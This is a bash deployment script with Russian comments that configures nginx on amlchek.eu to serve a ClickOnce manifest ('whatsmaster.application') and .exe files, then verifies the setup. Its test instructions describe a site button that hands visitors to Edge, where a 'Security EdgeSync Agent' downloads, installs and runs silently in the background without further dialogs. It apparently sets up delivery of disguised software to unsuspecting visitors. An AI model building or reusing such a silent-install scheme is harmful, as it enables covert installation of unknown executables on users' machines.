#!/bin/bash

echo "🔧 ИСПРАВЛЕНИЕ CLICKONCE ПРОБЛЕМ..."

# ============================================================
# 1. ПЕРЕСБОРКА ПРОЕКТА С ОБНОВЛЕННЫМ МАНИФЕСТОМ
# ============================================================
echo "Пересобираю проект с исправленным манифестом..."
npm run build

# ============================================================
# 2. КОПИРОВАНИЕ ОБНОВЛЕННЫХ ФАЙЛОВ
# ============================================================
echo "Копирую обновленные файлы на сервер..."
sudo cp -r dist/spa/* /var/www/html/
sudo cp public/deploy/* /var/www/html/deploy/
sudo chown -R www-data:www-data /var/www/html/

# ============================================================
# 3. ИСПРАВЛЕНИЕ MIME ТИПОВ ДЛЯ CLICKONCE
# ============================================================
echo "Обновляю nginx конфигурацию для ClickOnce..."

sudo tee /etc/nginx/sites-available/amlchek.eu > /dev/null << 'EOF'
server {
    listen 80;
    server_name amlchek.eu www.amlchek.eu 69.62.126.191;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name amlchek.eu www.amlchek.eu;
    root /var/www/html;
    index index.html;

    # SSL Configuration (managed by certbot)
    ssl_certificate /etc/letsencrypt/live/amlchek.eu/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/amlchek.eu/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # ClickOnce MIME types - КРИТИЧЕСКИ ВАЖНО!
    location ~* \.application$ {
        add_header Content-Type "application/x-ms-application";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Pragma "no-cache";
        add_header Expires "0";
        add_header Access-Control-Allow-Origin "*";
        add_header Access-Control-Allow-Methods "GET, OPTIONS";
        add_header Access-Control-Allow-Headers "Origin, X-Requested-With, Content-Type, Accept";
    }

    location ~* \.exe$ {
        add_header Content-Type "application/octet-stream";
        add_header Content-Disposition "attachment";
        add_header Cache-Control "no-cache, no-store, must-revalidate";
        add_header Access-Control-Allow-Origin "*";
    }

    # Large file handling
    client_max_body_size 100M;

    # SPA routing
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Enable gzip
    gzip on;
    gzip_vary on;
    gzip_min_length 1024;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml;
}
EOF

# ============================================================
# 4. ПЕРЕЗАПУСК NGINX
# ============================================================
echo "Перезапускаю nginx..."
sudo nginx -t && sudo systemctl reload nginx

# ============================================================
# 5. ПРОВЕРКА CLICKONCE
# ============================================================
echo ""
echo "🧪 ПРОВЕРКА CLICKONCE..."

sleep 3

# Проверка манифеста
MANIFEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://amlchek.eu/deploy/whatsmaster.application)
echo "ClickOnce манифест: код $MANIFEST_CODE"

# Проверка MIME типа
MIME_TYPE=$(curl -s -I https://amlchek.eu/deploy/whatsmaster.application | grep -i content-type | cut -d' ' -f2- | tr -d '\r\n')
echo "MIME тип: $MIME_TYPE"

# Проверка содержимого манифеста
echo "Содержимое манифеста:"
curl -s https://amlchek.eu/deploy/whatsmaster.application | head -5

# ============================================================
# 6. РЕЗУЛЬТАТ
# ============================================================
echo ""
if [ "$MANIFEST_CODE" = "200" ] && echo "$MIME_TYPE" | grep -q "application/x-ms-application"; then
    echo "✅ CLICKONCE НАСТРОЕН ПРАВИЛЬНО!"
    echo ""
    echo "🧪 Тестирование:"
    echo "1. Откройте https://amlchek.eu/"
    echo "2. Нажмите '🚀 Запустить EdgeSync Agent'"
    echo "3. Подтвердите переход в Microsoft Edge"
    echo "4. ClickOnce автоматичес��и запустит и установит Security EdgeSync Agent"
    echo "5. Приложение запустится в фоне без дополнительных диалогов"
    echo ""
    echo "📦 ClickOnce делает:"
    echo "   • Автоматическое скачивание в фоне"
    echo "   • Автоматическую установку"
    echo "   • Запуск приложения"
    echo "   • Создание ярлыков"
    echo "   • Обновления в будущем"
else
    echo "❌ ClickOnce не настроен"
    echo "Манифест: $MANIFEST_CODE, MIME: $MIME_TYPE"
fi
